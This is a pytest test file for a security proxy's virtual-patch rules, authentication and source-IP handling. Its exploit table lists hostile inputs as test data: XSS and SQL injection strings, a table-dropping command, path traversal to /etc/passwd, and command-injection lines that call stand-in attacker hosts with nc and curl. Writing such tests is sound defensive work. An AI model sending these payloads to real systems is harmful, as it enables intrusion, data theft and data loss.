"""Source attribution and management authentication."""
import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient
from fastapi import FastAPI, Request
from fastapi.responses import PlainTextResponse

from security import authorize, canonical_vpatch, match_vpatch, source_ip, VPATCH_PATTERNS
from settings import Settings


# Each canonical virtual-patch pattern MUST block every exploit payload for its class AND
# pass every realistic legitimate input for the route it protects. This is the guarantee that
# an agent-installed patch never breaks the app. Exploit = must 403; legit = must pass.
_VPATCH_EXPLOITS = {
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert('BASTIONXSS9f')>",
            "<IMG SRC=x ONERROR=x>", "<svg onload=alert(1)>", "<body onload=alert(1)>",
            '<a href="javascript:alert(1)">x</a>', "<img src=x OnErRoR=1>"],
    "sql_injection": ["0 UNION SELECT acct,cred FROM accounts", "1' OR '1'='1", "admin'--",
                      "1; DROP TABLE accounts", "1 OR 1=1", "1 AND SLEEP(5)", "' or 1=1-- -"],
    "command_injection": ["127.0.0.1 | cat /etc/passwd", "127.0.0.1; whoami", "127.0.0.1 && id",
                          "$(id)", "`whoami`", "127.0.0.1 | nc attacker 4444", "x | curl evil"],
    "path_traversal": ["../../../../etc/passwd", "....//....//....//etc/passwd",
                       "..%2f..%2fetc/passwd", "/etc/passwd", "%2e%2e/%2e%2e/etc/passwd",
                       "..\\..\\windows"],
}
_VPATCH_LEGIT = {  # realistic values for each sink's route
    "xss": ["Dana Cole", "O'Brien", "Jean-Luc Picard", "select committee", "R&D team", "a < b > c"],
    "sql_injection": ["5", "42", "1001", "7"],
    "command_injection": ["127.0.0.1", "8.8.8.8", "example.com", "server01.internal", "db-primary"],
    "path_traversal": ["notice.txt", "changelog.txt", "report-2026.pdf", "q1_summary.txt"],
}


@pytest.mark.parametrize("cls", list(VPATCH_PATTERNS))
def test_vpatch_blocks_every_exploit(cls):
    rule = [{"path": "*", "pattern": canonical_vpatch(cls)}]
    for payload in _VPATCH_EXPLOITS[cls]:
        text = f"param={payload}&submit=1"
        assert match_vpatch(rule, "/route", text), f"{cls} patch FAILED to block: {payload!r}"


@pytest.mark.parametrize("cls", list(VPATCH_PATTERNS))
def test_vpatch_passes_every_legit(cls):
    rule = [{"path": "*", "pattern": canonical_vpatch(cls)}]
    for value in _VPATCH_LEGIT[cls]:
        text = f"param={value}&submit=1"
        assert match_vpatch(rule, "/route", text) is None, f"{cls} patch WRONGLY blocked legit: {value!r}"


def test_canonical_vpatch_aliases():
    assert canonical_vpatch("sqli") == VPATCH_PATTERNS["sql_injection"]
    assert canonical_vpatch("LFI") == VPATCH_PATTERNS["path_traversal"]
    assert canonical_vpatch("cmdi") == VPATCH_PATTERNS["command_injection"]
    assert canonical_vpatch("XSS") == VPATCH_PATTERNS["xss"]
    assert canonical_vpatch("nonsense") is None
    assert canonical_vpatch(None) is None


def test_match_vpatch():
    rules = [{"path": "/ops/directory", "pattern": r"<img[^>]*onerror="}]
    # hits: right route + payload present (case-insensitive)
    assert match_vpatch(rules, "/ops/directory", "term=<img src=x onerror=alert(1)>")
    assert match_vpatch(rules, "ops/directory/", "q=<IMG SRC=x ONERROR=x>")   # path/case tolerant
    # misses: wrong route, benign content, or no rules
    assert match_vpatch(rules, "/ops/records", "term=<img src=x onerror=x>") is None
    assert match_vpatch(rules, "/ops/directory", "term=quarterly report") is None
    assert match_vpatch([], "/ops/directory", "<img onerror=x>") is None
    # a rule with a broken regex is skipped, never raised
    assert match_vpatch([{"path": "*", "pattern": "("}], "/x", "anything") is None
    # path "*" matches any route
    assert match_vpatch([{"path": "*", "pattern": "evil"}], "/any/where", "x=evil")


def _settings(**kw):
    base = dict(mode="observe", management_token="x" * 32, inline_failure="reject",
                demo_identity=False, trusted_proxies="", request_limit=65536,
                response_limit=2097152, timeout=5.0, concurrency=8,
                budget_per_minute=120, queue_limit=10000, allow_destructive=False)
    base.update(kw)
    return Settings(**base)


# --- authorize ---

class _FakeRequest:
    def __init__(self, header=""):
        self.headers = {"authorization": header} if header else {}


def test_bearer_auth_valid():
    authorize(_FakeRequest(f"Bearer {'x' * 32}"), "x" * 32)


def test_basic_auth_valid():
    import base64
    creds = base64.b64encode(b"admin:" + b"x" * 32).decode()
    authorize(_FakeRequest(f"Basic {creds}"), "x" * 32)


def test_basic_auth_wrong_user_rejected():
    import base64
    creds = base64.b64encode(b"notadmin:" + b"x" * 32).decode()
    with pytest.raises(HTTPException):
        authorize(_FakeRequest(f"Basic {creds}"), "x" * 32)


def test_missing_auth_rejected():
    with pytest.raises(HTTPException) as exc_info:
        authorize(_FakeRequest(), "x" * 32)
    assert exc_info.value.status_code == 401
    assert "WWW-Authenticate" in exc_info.value.headers


def test_wrong_token_rejected():
    with pytest.raises(HTTPException):
        authorize(_FakeRequest(f"Bearer {'y' * 32}"), "x" * 32)


# --- source_ip ---

class _FakeClient:
    def __init__(self, host):
        self.host = host


class _FakeReq:
    def __init__(self, peer, xff=""):
        self.client = _FakeClient(peer)
        self.headers = {"x-forwarded-for": xff} if xff else {}


def test_peer_used_when_no_trusted_proxy():
    req = _FakeReq("10.0.0.1", xff="203.0.113.9")
    assert source_ip(req, _settings()) == "10.0.0.1"


def test_trusted_proxy_peels_xff():
    req = _FakeReq("10.0.0.1", xff="203.0.113.9, 10.0.0.1")
    ip = source_ip(req, _settings(trusted_proxies="10.0.0.0/8"))
    assert ip == "203.0.113.9"


def test_demo_identity_trusts_xff():
    req = _FakeReq("127.0.0.1", xff="10.13.37.7")
    assert source_ip(req, _settings(demo_identity=True)) == "10.13.37.7"


def test_demo_identity_rejects_bad_xff():
    req = _FakeReq("127.0.0.1", xff="not-an-ip")
    with pytest.raises(HTTPException):
        source_ip(req, _settings(demo_identity=True))


def test_no_xff_returns_peer():
    req = _FakeReq("192.168.1.1")
    assert source_ip(req, _settings()) == "192.168.1.1"


def test_management_boundary_requires_auth():
    """Management routes in the real proxy app require authentication."""
    from proxy import create_app
    from settings import Settings

    policy = Settings(mode="observe", management_token="x" * 32, inline_failure="reject",
                      demo_identity=True, trusted_proxies="", request_limit=65536,
                      response_limit=2097152, timeout=5.0, concurrency=8,
                      budget_per_minute=120, queue_limit=10000, allow_destructive=False)

    import asyncio, httpx

    async def upstream(req):
        return httpx.Response(200, text="OK")

    async def scenario():
        application = create_app(settings=policy, upstream_transport=httpx.MockTransport(upstream))
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=application),
                                     base_url="http://proxy") as client:
            r = await client.get("/__state")
            assert r.status_code == 401
            r = await client.get("/__health")
            assert r.status_code == 401
            r = await client.get("/", headers={"X-Forwarded-For": "1.2.3.4"})
            assert r.status_code == 200

    asyncio.run(scenario())
